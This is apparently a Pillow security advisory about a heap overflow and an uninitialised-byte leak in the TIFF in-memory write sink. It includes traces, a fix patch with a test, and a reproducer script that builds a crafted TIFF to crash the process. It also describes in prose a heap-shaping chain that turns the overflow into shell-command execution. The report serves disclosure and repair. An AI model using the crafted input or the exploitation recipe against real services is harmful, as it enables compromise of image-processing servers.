                "markdown": "```\n============================================================================\nHeap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO\nLocation: src/libImaging/TiffDecode.c:94  in _tiffWriteProc()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.\n\nThe bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of from the write position `state-\u003eloc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.\n\nNo save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.\n\nThe attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), \"TIFF\")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.\n\n## Details\n\nWhen `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:\n\n1. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of `state-\u003eloc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved.\n2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.\n\nBoth are reachable with default settings by the ordinary \"re-encode the upload\" sequence `Image.open(upload); im.save(io.BytesIO(), \"TIFF\")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info[\"compression\"]` (still selecting libtiff) and `im.info[\"icc_profile\"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), \"TIFF\")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.\n\n**Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), \"TIFF\")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports\n\n```\nAddressSanitizer: heap-buffer-overflow ... WRITE of size 65536\n #1 _tiffWriteProc src/libImaging/TiffDecode.c:115\n #4 TIFFFlush\n #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056\n0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103\n```\n\n**Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression=\"tiff_lzw\"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.\n\n### Code walk-through\n\nThe sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:\n\n```c\n/* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */\n    case 0: state-\u003eloc = off;            break;   /* may exceed eof and size */\n    case 1: state-\u003eloc += off;           break;\n    case 2: state-\u003eloc = state-\u003eeof + off; break;\n```\n\nand writing assumes `loc \u003c= size`:\n\n```c\n/* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */\n    to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);   /* negative if loc \u003e size */\n    if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n        tsize_t newsize = state-\u003esize;\n        while (newsize \u003c (size + state-\u003esize)) {               /* capacity target ignores loc */\n            …\n            newsize += 64 * 1024;\n        }\n        new_data = realloc(state-\u003edata, newsize);              /* tail left uninitialised */\n        …\n        state-\u003esize = newsize;\n        to_write = size;\n    }\n    _TIFFmemcpy((UINT8 *)state-\u003edata + state-\u003eloc, buf, to_write);   /* :115 */\n    state-\u003eloc += (toff_t)to_write;\n    state-\u003eeof = MAX(state-\u003eloc, state-\u003eeof);\n```\n\nA gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:\n\n```\nwrite size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode:\nwrite size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows)\nseek  off=0     whence=2       -\u003e loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even\nseek  off=4;  write size=4 at loc=4                        link IFD offset into header\nseek  off=65662 whence=0       (eof=65536 size=65536)      65536 + 126-byte IFD (10 entries) = tag data area\nwrite size=65536 at loc=65662  (eof=65536 size=65536)      ImageDescription, first out-of-line value\n```\n\nFor that last call `to_write = 65536 − 65662 = −126`, the loop grows `newsize` until it is ≥ `65536 + 65536`, i.e. to 131072, and the `memcpy` writes `[65662, 131198)` into a 131072-byte block: 126 bytes past the end, containing the last 126 bytes of the description string. `loc`/`eof` become 131198 \u003e `size`; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.\n\nThe general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.\n\nThe disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.\n\nThe defect was introduced in e782fe721e01 (\"initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support\", 2013-03-08), first released in Pillow 2.0.0.\n\n## Impact\n\nAny service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).\n\nGiven two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), \"TIFF\")` per upload executed an attacker-chosen shell command (`id\u003e/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`\u0026system`, `\u0026PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif-\u003etif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system(\"id\u003e/tmp/r.…\") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.\n\nIndependently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.\n\n## Reproducing\n\n`repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.\n\n**Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open(\"upload.tif\").save(\u003ctarget\u003e, \"TIFF\")` with no options, once with `\"out.tif\"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.\n\n**Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression=\"tiff_lzw\"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.\n\nExpected output on this tree:\n\n```\nupload.tif: 131198 bytes\nsave to file path : exit code 0, out.tif = 131210 bytes\nsave to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size'\n-\u003e heap overflow crashed the process: True\n\nsame image, same options, saved to a file path vs. to a BytesIO:\n  offset 369177: file 0x00   BytesIO 0x55\n  offset 369417: file 0x00   BytesIO 0x55\n  offset 369423: file 0x00   BytesIO 0x55\n  offset 369451: file 0x00   BytesIO 0x55\n\n-\u003e BytesIO output contains never-written heap bytes: True\n\nBUG\n```\n\nThe last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.\n\n## Suggested fix\n\nThe attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc \u003e size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:\n\n```diff\n-        while (newsize \u003c (size + state-\u003esize)) {\n+        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n …\n+        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n         state-\u003edata = new_data;\n         state-\u003esize = newsize;\n         to_write = size;\n+    } else if (to_write \u003c 0) {\n+        TIFFError(\"_tiffWriteProc\", \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64, …);\n+        return 0;\n     }\n```\n\n`_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. The patch also adds `test_save_bytesio_seek_past_end` to `Tests/test_file_libtiff.py`, which saves the PackBits 64 KiB-boundary case and an LZW case with odd-length tags to both a file and a `BytesIO` and asserts the outputs are identical. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.\n\n## The patch\n\nSize the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc\n\nApplies to `src/libImaging/TiffDecode.c` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..d2a926a62 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -760,6 +760,38 @@ class TestFileLibTiff(LibTiffTestCase):\n         save_bytesio(\"packbits\")\n         save_bytesio(\"tiff_lzw\")\n \n+    def test_save_bytesio_seek_past_end(self, tmp_path: Path) -\u003e None:\n+        # When writing the directory, libtiff seeks past the end of the data\n+        # written so far, and then writes the tag values there. Check that the\n+        # in-memory write buffer grows to fit, and that the bytes that are\n+        # skipped over are zero, as they would be when writing to a file.\n+\n+        # 7 distinct bytes per row: PackBits emits 8 bytes per row, so the strip\n+        # plus the header are exactly 64 KiB, the initial size of the buffer\n+        im = Image.new(\"L\", (7, 8191))\n+        im.putdata([(i * 37) \u0026 0xFF for i in range(7 * 8191)])\n+        kwargs = {\"compression\": \"packbits\", \"description\": \"D\" * 65535}\n+\n+        outfile = tmp_path / \"temp.tif\"\n+        im.save(outfile, **kwargs)\n+        buffer_io = io.BytesIO()\n+        im.save(buffer_io, format=\"tiff\", **kwargs)\n+        assert buffer_io.getvalue() == outfile.read_bytes()\n+\n+        # odd-length tag values, so that libtiff pads between them. Large enough\n+        # that the buffer has to be reallocated\n+        im = hopper().resize((300, 300))\n+        kwargs = {\n+            \"compression\": \"tiff_lzw\",\n+            \"description\": \"abcdef\",\n+            \"software\": \"xyz0\",\n+            \"tiffinfo\": {315: \"artist\", 33432: \"copyright!\"},\n+        }\n+        im.save(outfile, **kwargs)\n+        buffer_io = io.BytesIO()\n+        im.save(buffer_io, format=\"tiff\", **kwargs)\n+        assert buffer_io.getvalue() == outfile.read_bytes()\n+\n     def test_save_ycbcr(self, tmp_path: Path) -\u003e None:\n         im = hopper(\"YCbCr\")\n         outfile = tmp_path / \"temp.tif\"\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..dd9945493 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -87,11 +87,13 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n     TRACE((\"_tiffWriteProc: %d \\n\", (int)size));\n     dump_state(state);\n \n+    // libtiff may have seeked past the end of the buffer, e.g. when writing the\n+    // directory, so the required size is based on the current location.\n     to_write = MIN(size, state-\u003esize - (tsize_t)state-\u003eloc);\n     if (state-\u003eflrealloc \u0026\u0026 size \u003e to_write) {\n         tdata_t new_data;\n         tsize_t newsize = state-\u003esize;\n-        while (newsize \u003c (size + state-\u003esize)) {\n+        while (newsize \u003c (size + (tsize_t)state-\u003eloc)) {\n             if (newsize \u003e INT_MAX - 64 * 1024) {\n                 return 0;\n             }\n@@ -105,9 +107,20 @@ _tiffWriteProc(thandle_t hdata, tdata_t buf, tsize_t size) {\n             // fail out\n             return 0;\n         }\n+        // zero the new space, so that any bytes libtiff seeks over without\n+        // writing are 0 in the output, as they would be in a file\n+        memset((UINT8 *)new_data + state-\u003esize, 0, newsize - state-\u003esize);\n         state-\u003edata = new_data;\n         state-\u003esize = newsize;\n         to_write = size;\n+    } else if (to_write \u003c 0) {\n+        TIFFError(\n+            \"_tiffWriteProc\",\n+            \"Invalid Write at loc %\" PRIu64 \", size: %\" PRIu64,\n+            state-\u003eloc,\n+            (toff_t)state-\u003esize\n+        );\n+        return 0;\n     }\n \n     TRACE((\"to_write: %d\\n\", (int)to_write));\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 5,434 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPillow: heap overflow + stale heap bytes in the libtiff in-memory write sink\n(_tiffWriteProc, src/libImaging/TiffDecode.c).\n\nim.save(\u003cBytesIO\u003e, \"TIFF\") with any compression goes through libtiff writing\ninto Pillow's memory sink. When libtiff writes the directory it seeks *past*\nthe end of the data written so far and writes tag values there:\n\n  1. _tiffWriteProc grows the buffer to `size + write_len` instead of\n     `loc + write_len`, so that write can run off the end of the allocation.\n  2. The bytes libtiff skipped over are never written, so whatever the heap\n     held there ends up in the output file.\n\nThe same saves to a file path are fine (the kernel zero-fills skipped bytes),\nwhich is the control for both parts.\n\"\"\"\nimport os\nimport resource\nimport struct\nimport subprocess\nimport sys\nimport tempfile\n\nresource.setrlimit(resource.RLIMIT_CORE, (0, 0))   # the overflow aborts; no core file\nos.chdir(tempfile.mkdtemp())\n\n\ndef run(code, **env):\n    \"\"\"Run a Python snippet against the installed Pillow in a fresh process.\"\"\"\n    return subprocess.run([sys.executable, \"-c\", code], env={**os.environ, **env},\n                          capture_output=True, text=True)\n\n\ndef setup_env():\n    \"\"\"Write upload.tif: an L-mode 7x8191 PackBits TIFF with a 65535-char ImageDescription.\n\n    Sizes are chosen so that, when Pillow re-encodes it:\n      - the PackBits strip is 8191 rows x 8 bytes + 8-byte header = 65536 bytes,\n        i.e. the data ends exactly at the sink's initial 64 KiB buffer;\n      - the first out-of-line tag value (ImageDescription + NUL) is 65536 bytes\n        and goes at 65536 + 126 (the 10-entry IFD sits in between).\n    The sink grows to 65536 + 65536 = 131072 bytes, then writes [65662, 131198):\n    the last 126 bytes of the description land past the end of the heap block.\n    \"\"\"\n    w, h = 7, 8191\n    # 7 distinct bytes per row -\u003e PackBits can only emit one literal run: 1 + 7 bytes\n    strip = b\"\".join(b\"\\x06\" + bytes((y * 7 + x) * 37 \u0026 0xFF for x in range(w)) for y in range(h))\n    desc = b\"D\" * 65535 + b\"\\x00\"\n    strip_off, desc_off = 8, 8 + len(strip)\n    ifd_off = desc_off + len(desc)\n    entries = [\n        (256, 4, 1, w),                  # ImageWidth\n        (257, 4, 1, h),                  # ImageLength\n        (258, 3, 1, 8),                  # BitsPerSample\n        (259, 3, 1, 32773),              # Compression = PackBits (inherited by save())\n        (262, 3, 1, 1),                  # PhotometricInterpretation = BlackIsZero\n        (270, 2, len(desc), desc_off),   # ImageDescription (carried into save() via tag_v2)\n        (273, 4, 1, strip_off),          # StripOffsets\n        (277, 3, 1, 1),                  # SamplesPerPixel\n        (278, 4, 1, h),                  # RowsPerStrip\n        (279, 4, 1, len(strip)),         # StripByteCounts\n    ]\n    ifd = struct.pack(\"\u003cH\", len(entries))\n    ifd += b\"\".join(struct.pack(\"\u003cHHII\", *e) for e in entries)\n    ifd += struct.pack(\"\u003cI\", 0)\n    with open(\"upload.tif\", \"wb\") as f:\n        f.write(struct.pack(\"\u003c2sHI\", b\"II\", 42, ifd_off) + strip + desc + ifd)\n\n\n# ---------------------------------------------------------------------------\n# Part 1: heap buffer overflow. Re-save an uploaded TIFF with no options.\n# ---------------------------------------------------------------------------\nsetup_env()\nprint(f\"upload.tif: {os.path.getsize('upload.tif')} bytes\")\n\nRESAVE = 'from PIL import Image; import io; Image.open(\"upload.tif\").save({target}, \"TIFF\")'\n\n# Control: saving to a file path (real fd, no memory sink) works\ncontrol = run(RESAVE.format(target='\"out.tif\"'))\nprint(f\"save to file path : exit code {control.returncode}, out.tif = {os.path.getsize('out.tif')} bytes\")\n\n# PoC: the identical save into a BytesIO\npoc = run(RESAVE.format(target=\"io.BytesIO()\"))\nprint(f\"save to BytesIO   : exit code {poc.returncode}, stderr: {poc.stderr.strip()!r}\")\n\n# A process killed by a signal (SIGABRT from glibc's heap check) = heap corrupted\noverflow = control.returncode == 0 and poc.returncode \u003c 0\nprint(f\"-\u003e heap overflow crashed the process: {overflow}\\n\")\n\n\n# ---------------------------------------------------------------------------\n# Part 2: stale heap bytes in the output. MALLOC_PERTURB_=170 makes glibc fill\n# fresh allocations with 0x55, so never-written bytes become visible.\n# ---------------------------------------------------------------------------\nSTALE = r'''\nimport io, random\nfrom PIL import Image\nrandom.seed(1)\nim = Image.new(\"RGB\", (300, 300))      # noise -\u003e ~360 KB LZW, so the sink must realloc()\nim.putdata([tuple(random.randrange(256) for _ in \"rgb\") for _ in range(300 * 300)])\n# odd-length ASCII tags: libtiff skips one pad byte after each\nkw = dict(compression=\"tiff_lzw\", description=\"abcdef\", software=\"xyz0\",\n          tiffinfo={315: \"artist\", 33432: \"copyright!\", 306: \"2024:01:01 00:00:00\"})\nim.save(\"ref.tif\", \"TIFF\", **kw)\nbuf = io.BytesIO()\nim.save(buf, \"TIFF\", **kw)\na, b = open(\"ref.tif\", \"rb\").read(), buf.getvalue()\nfor i in (i for i in range(len(a)) if a[i] != b[i]):\n    print(f\"  offset {i}: file 0x{a[i]:02x}   BytesIO 0x{b[i]:02x}\")\n'''\nstale = run(STALE, MALLOC_PERTURB_=\"170\").stdout\nprint(\"same image, same options, saved to a file path vs. to a BytesIO:\")\nprint(stale or \"  outputs identical\")\nleak = \"BytesIO 0x55\" in stale\nprint(f\"-\u003e BytesIO output contains never-written heap bytes: {leak}\\n\")\n\nprint(\"BUG\" if overflow or leak else \"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nHeap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO\nLocation: src/libImaging/TiffDecode.c:94  in _tiffWriteProc()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nPillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.\n\nThe bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of from the write position `state-\u003eloc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.\n\nNo save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.\n\nThe attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), \"TIFF\")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.\n\n## Details\n\nWhen `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:\n\n1. `_tiffWriteProc` sizes its `realloc()` from `state-\u003esize + size` instead of `state-\u003eloc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved.\n2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.\n\nBoth are reachable with default settings by the ordinary \"re-encode the upload\" sequence `Image.open(upload); im.save(io.BytesIO(), \"TIFF\")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info[\"compression\"]` (still selecting libtiff) and `im.info[\"icc_profile\"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), \"TIFF\")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.\n\n**Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), \"TIFF\")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports\n\n```\nAddressSanitizer: heap-buffer-overflow ... WRITE of size 65536\n #1 _tiffWriteProc src/libImaging/TiffDecode.c:115\n #4 TIFFFlush\n #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056\n0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103\n```\n\n**Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression=\"tiff_lzw\"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 